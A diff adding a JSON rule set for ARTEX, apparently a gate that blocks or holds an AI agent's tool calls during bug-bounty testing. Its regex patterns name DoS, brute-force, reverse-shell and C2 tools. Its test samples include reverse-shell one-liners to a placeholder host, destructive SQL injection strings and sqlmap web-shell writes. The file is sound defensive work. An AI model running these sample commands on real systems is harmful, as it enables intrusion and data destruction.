@@ -1,0 +1,203 @@
+{
+  "_comment": "Intercept rules for ARTEX, in the exact shape of POST /api/intercept/rules (server/intercept.go:467). Load with: python3 bbkit/load_rules.py --base http://localhost:8787 --token <jwt>. Out of the box ARTEX enables only ONE hard rule ('[内置] 破坏性系统命令'); its data-exfil rule ships disabled (db/db.go:568) because the curl|nc pattern misfires on legitimate reverse shells. These rules add the bug-bounty-specific gates on top. 'deny' blocks outright; 'ask' holds the call until you approve it (timeout_action deny = fail closed).",
+  "rules": [
+    {
+      "name": "[BB] Né proxy — chặn tuyệt đối",
+      "enabled": true,
+      "priority": 200,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)(--noproxy|--proxy[= ]*['\"]{2}|-x[= ]*['\"]{2}|\\bunset[ \\t]+(HTTP|HTTPS|ALL)_PROXY|\\bexport[ \\t]+(HTTP|HTTPS|ALL)_PROXY=[ \\t]*$|\\benv[ \\t]+-u[ \\t]+(HTTP|HTTPS|ALL)_PROXY|\\bNO_PROXY=[*]|--insecure-skip-proxy)",
+      "action": "deny",
+      "message": "Lệnh này cố né egress proxy (bbguard). Mọi traffic phải đi qua proxy để scope + rate limit được enforce và được ghi audit. Nếu cần host này, thêm vào scope.json chứ không bỏ proxy.",
+      "timeout_enabled": false,
+      "timeout_seconds": 60,
+      "timeout_action": "deny",
+      "should_match": [
+        "curl --noproxy '' https://api.target.com/",
+        "curl -x '' http://target.com",
+        "unset HTTPS_PROXY && curl http://x",
+        "env -u HTTP_PROXY curl http://x"
+      ],
+      "should_not_match": [
+        "curl -x http://127.0.0.1:8899 https://api.target.com/",
+        "curl https://api.target.com/"
+      ]
+    },
+    {
+      "name": "[BB] Công cụ DoS / stress — chặn tuyệt đối",
+      "enabled": true,
+      "priority": 195,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)\\b(slowloris|slowhttptest|hulk|goldeneye|torshammer|xerxes|hping3|t50|mhddos|ab[ \\t]+-n[ \\t]*[0-9]{4,}|siege|wrk[ \\t]+-|boom[ \\t]+-|vegeta[ \\t]+attack)\\b",
+      "action": "deny",
+      "message": "DoS/stress testing bị cấm ở gần như mọi chương trình bug bounty và là đường nhanh nhất để bị ban + chịu trách nhiệm pháp lý.",
+      "timeout_enabled": false,
+      "timeout_seconds": 60,
+      "timeout_action": "deny",
+      "should_match": [
+        "slowhttptest -c 1000 -u https://target.com",
+        "ab -n 100000 -c 50 https://target.com/",
+        "vegeta attack -rate=500"
+      ],
+      "should_not_match": [
+        "curl https://target.com/",
+        "nuclei -u https://target.com -rl 10"
+      ]
+    },
+    {
+      "name": "[BB] Phá dữ liệu trên target — chặn tuyệt đối",
+      "enabled": true,
+      "priority": 190,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)(\\b(DROP|TRUNCATE)[ \\t]+(TABLE|DATABASE|SCHEMA)\\b|\\bDELETE[ \\t]+FROM\\b|--os-shell|--os-pwn|--file-write|--file-dest|--sql-shell)",
+      "action": "deny",
+      "message": "Ghi/xoá dữ liệu hoặc lấy shell trên hệ thống target vượt quá phạm vi PoC của bug bounty. Chứng minh lỗ hổng bằng read-only PoC, rồi mô tả impact trong report.",
+      "timeout_enabled": false,
+      "timeout_seconds": 60,
+      "timeout_action": "deny",
+      "should_match": [
+        "sqlmap -u 'https://t/a?id=1' --os-shell",
+        "' OR 1=1; DROP TABLE users--",
+        "sqlmap -u x --file-write=/tmp/s.php --file-dest=/var/www/s.php",
+        "'; DELETE FROM sessions--"
+      ],
+      "should_not_match": [
+        "sqlmap -u 'https://t/a?id=1' --batch --dbs",
+        "curl 'https://t/api/user?id=1'"
+      ]
+    },
+    {
+      "name": "[BB] Brute force / credential stuffing — cần duyệt",
+      "enabled": true,
+      "priority": 180,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)\\b(hydra|medusa|patator|ncrack|crowbar|brutespray|crackmapexec|kerbrute|john|hashcat)\\b",
+      "action": "ask",
+      "message": "Brute force bị nhiều chương trình cấm và gây account lockout cho user thật. Chỉ duyệt nếu policy cho phép rõ ràng VÀ bạn dùng account test của mình.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "hydra -l admin -P rockyou.txt target.com http-post-form",
+        "hashcat -m 0 hash.txt rockyou.txt"
+      ],
+      "should_not_match": [
+        "curl -u admin:admin https://target.com/"
+      ]
+    },
+    {
+      "name": "[BB] Fuzz tốc độ cao — cần duyệt",
+      "enabled": true,
+      "priority": 170,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)((-t|--threads)[ \\t]*([5-9][0-9]|[1-9][0-9]{2,})|(--rate|--rate-limit|-rate|-rl)[ \\t]*([2-9][0-9]{2}|[1-9][0-9]{3,})|--min-rate[ \\t]*[0-9]{4,})",
+      "action": "ask",
+      "message": "Tốc độ/thread cao bất thường. bbguard vẫn pace ở tầng proxy, nhưng hãy xác nhận policy chương trình cho phép mức này — nhiều program coi đây là DoS.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "ffuf -u https://target.com/FUZZ -w w.txt -t 200",
+        "nuclei -u https://t -rl 5000",
+        "nmap --min-rate 10000 target.com"
+      ],
+      "should_not_match": [
+        "ffuf -u https://target.com/FUZZ -w w.txt -t 10",
+        "nuclei -u https://t -rl 10"
+      ]
+    },
+    {
+      "name": "[BB] Nmap/masscan xâm nhập — cần duyệt",
+      "enabled": true,
+      "priority": 165,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)\\b(masscan|zmap)\\b|nmap\\b[^\\n]*(-T[45]|--script[= ]*[^\\n]*(vuln|intrusive|exploit|dos|brute)|--min-rate[ \\t]*[0-9]{4,}|-sU[^\\n]*-p-)",
+      "action": "ask",
+      "message": "Nmap/masscan KHÔNG tôn trọng HTTP_PROXY — chúng chỉ bị chặn bởi egress lock ở tầng network (deploy/egress-lock.sh). Nếu chưa bật lock, lệnh này có thể ra ngoài scope mà bbguard không thấy.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "nmap -T5 target.com",
+        "masscan -p1-65535 192.0.2.0/24",
+        "nmap --script vuln target.com"
+      ],
+      "should_not_match": [
+        "nmap -T2 -p 80,443 target.com",
+        "nmap -sV target.com"
+      ]
+    },
+    {
+      "name": "[BB] Reverse shell / C2 — cần duyệt",
+      "enabled": true,
+      "priority": 160,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)(\\bnc\\b[ \\t]+[^\\n]*-[a-z]*e[a-z]*[ \\t]|bash[ \\t]+-i[ \\t]*>&|/dev/tcp/|\\b(msfconsole|msfvenom|meterpreter|sliver|havoc|cobaltstrike|empire)\\b|python[23]?[ \\t]+-c[ \\t]*['\"][^'\"]*socket)",
+      "action": "ask",
+      "message": "Reverse shell / C2 framework. Với bug bounty, RCE thường chỉ cần PoC vô hại (ví dụ `id`, `hostname`). Shell tương tác thường vượt scope và luôn phải nêu rõ trong report.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "nc -e /bin/sh 1.2.3.4 4444",
+        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+        "msfvenom -p linux/x64/shell_reverse_tcp",
+        "cat /dev/tcp/1.2.3.4/80"
+      ],
+      "should_not_match": [
+        "nc -zv target.com 443",
+        "curl https://target.com/"
+      ]
+    },
+    {
+      "name": "[BB] Gửi mail / SMS qua target — cần duyệt",
+      "enabled": true,
+      "priority": 150,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)(/api/[^\\n]*(invite|send-?mail|sendmail|notify|sms|verify-?email)|\\bsendmail\\b|\\bswaks\\b|smtp-user-enum)",
+      "action": "ask",
+      "message": "Endpoint gửi mail/SMS: test có thể spam user thật hoặc đốt quota của chương trình. Chỉ duyệt khi gửi tới địa chỉ của chính bạn.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "curl -X POST https://t/api/v1/invite -d email=x@y.com",
+        "curl https://t/api/sms/send",
+        "swaks --to x@y.com --server mail.t.com"
+      ],
+      "should_not_match": [
+        "curl https://t/api/users/me"
+      ]
+    },
+    {
+      "name": "[BB] Tool fuzz/scan hàng loạt — cần duyệt",
+      "enabled": true,
+      "priority": 120,
+      "match_target": "tool_input",
+      "match_type": "regex",
+      "pattern": "(?i)\\b(ffuf|feroxbuster|gobuster|dirsearch|dirb|wfuzz|nuclei|nikto|wpscan|arjun|paramspider|kiterunner|\\bkr\\b)\\b",
+      "action": "ask",
+      "message": "Automated scanning. Xác nhận: (1) policy chương trình cho phép, (2) target nằm trong scope.json của bbguard, (3) tốc độ phù hợp. Đây là rule ồn nhất — tắt nó trong trang Cấu hình nếu chương trình cho phép scan tự do.",
+      "timeout_enabled": true,
+      "timeout_seconds": 300,
+      "timeout_action": "deny",
+      "should_match": [
+        "ffuf -u https://target.com/FUZZ -w w.txt",
+        "nuclei -u https://target.com -rl 10",
+        "wpscan --url https://target.com"
+      ],
+      "should_not_match": [
+        "curl https://target.com/robots.txt",
+        "httpx -l hosts.txt"
+      ]
+    }
+  ]
+}
